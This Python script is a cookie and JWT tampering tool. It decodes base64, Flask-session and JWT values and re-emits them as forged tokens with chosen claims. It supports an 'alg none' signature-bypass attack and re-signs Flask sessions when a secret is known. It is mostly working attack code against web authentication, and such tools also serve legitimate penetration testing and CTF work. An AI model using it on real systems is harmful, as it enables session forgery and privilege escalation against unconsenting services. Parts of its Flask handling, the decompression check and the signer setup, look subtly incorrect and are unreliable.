#!/usr/bin/env python3
"""
Cookie and JWT decoder / tamperer.
Decodes and re-encodes base64 cookies, JSON cookies, Flask session cookies, and JWTs.
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import zlib


# ── Base64 cookie ─────────────────────────────────────────────────────────────

def decode_b64_cookie(value: str) -> str:
    value = value.strip()
    try:
        padded = value + '=' * (-len(value) % 4)
        decoded = base64.urlsafe_b64decode(padded)
        return decoded.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[!] Base64 decode failed: {e}"


def encode_b64_cookie(value: str) -> str:
    return base64.urlsafe_b64encode(value.encode()).rstrip(b'=').decode()


# ── Flask session cookie ──────────────────────────────────────────────────────

def decode_flask_session(cookie: str) -> dict | None:
    """
    Flask session cookies have the format: base64(compressed_json).signature
    """
    try:
        if cookie.startswith('.'):
            cookie = cookie[1:]
        payload_part = cookie.split('.')[0]
        # Add padding
        padded = payload_part + '=' * (-len(payload_part) % 4)
        data = base64.urlsafe_b64decode(padded)
        # Flask may zlib-compress if first byte is '.'
        if data[:1] == b'.':
            data = zlib.decompress(data[1:])
        return json.loads(data)
    except Exception as e:
        return None


def forge_flask_session(data: dict, secret: str) -> str:
    """Re-sign a Flask session cookie with a known secret."""
    try:
        from itsdangerous import URLSafeTimedSerializer, TimestampSigner
        s = TimestampSigner(secret)
        payload = base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).rstrip(b'=')
        return s.sign(payload).decode()
    except ImportError:
        return "[!] itsdangerous not installed: pip install itsdangerous"


# ── JWT ───────────────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Not a valid JWT (expected 3 dot-separated parts)", file=sys.stderr)
        sys.exit(1)
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def encode_jwt(header: dict, payload: dict, secret: str | None = None,
               alg: str = "HS256") -> str:
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    unsigned = f"{h}.{p}"

    if alg.lower() == "none" or secret is None:
        return f"{unsigned}."

    hash_fn = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
               "hs512": hashlib.sha512}.get(alg.lower(), hashlib.sha256)
    sig = hmac.new(secret.encode(), unsigned.encode(), hash_fn).digest()
    return f"{unsigned}.{b64url_encode(sig)}"


def set_claims(payload: dict, claims: list[str]) -> dict:
    for claim in claims:
        k, _, v = claim.partition("=")
        try:
            v = json.loads(v)
        except Exception:
            pass
        payload[k] = v
    return payload


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Cookie and JWT decoder / tamperer")
    parser.add_argument("--value",   required=True, help="Cookie or JWT value")
    parser.add_argument("--type",    choices=["jwt", "b64", "flask", "auto"],
                        default="auto", help="Cookie type (default: auto-detect)")

    # JWT options
    parser.add_argument("--set-claim", action="append", default=[], dest="claims",
                        metavar="KEY=VALUE", help="Set a JWT/cookie claim (repeatable)")
    parser.add_argument("--secret",  help="HMAC secret for JWT re-signing or Flask forge")
    parser.add_argument("--alg",     default="HS256",
                        help="JWT algorithm for re-signing (default: HS256, use 'none' for none-attack)")

    parser.add_argument("--decode",  action="store_true", help="Only decode, do not modify")
    args = parser.parse_args()

    value = args.value

    # Auto-detect type
    cookie_type = args.type
    if cookie_type == "auto":
        if value.count('.') == 2 and len(value) > 30:
            cookie_type = "jwt"
        elif value.startswith('.') and '.' in value[1:]:
            cookie_type = "flask"
        else:
            cookie_type = "b64"

    print(f"[*] Detected type: {cookie_type}")

    if cookie_type == "jwt":
        header, payload, sig = decode_jwt(value)
        print(f"\n[*] Header:  {json.dumps(header, indent=2)}")
        print(f"[*] Payload: {json.dumps(payload, indent=2)}")
        print(f"[*] Signature: {sig}")

        if not args.decode and args.claims:
            payload = set_claims(payload, args.claims)
            header["alg"] = args.alg
            forged = encode_jwt(header, payload, args.secret, args.alg)
            print(f"\n[+] Forged JWT: {forged}")

    elif cookie_type == "flask":
        data = decode_flask_session(value)
        if data:
            print(f"\n[*] Flask session data: {json.dumps(data, indent=2)}")
            if not args.decode and args.claims:
                data = set_claims(data, args.claims)
                if args.secret:
                    forged = forge_flask_session(data, args.secret)
                    print(f"\n[+] Forged Flask session: {forged}")
                else:
                    print("[!] --secret required to forge Flask session")
        else:
            print("[!] Could not decode Flask session cookie")

    elif cookie_type == "b64":
        decoded = decode_b64_cookie(value)
        print(f"\n[*] Decoded: {decoded}")
        if not args.decode and args.claims:
            try:
                data = json.loads(decoded)
                data = set_claims(data, args.claims)
                forged = encode_b64_cookie(json.dumps(data, separators=(',', ':')))
                print(f"\n[+] Forged cookie: {forged}")
            except json.JSONDecodeError:
                print("[!] Decoded value is not JSON; cannot apply --set-claim")


if __name__ == "__main__":
    main()
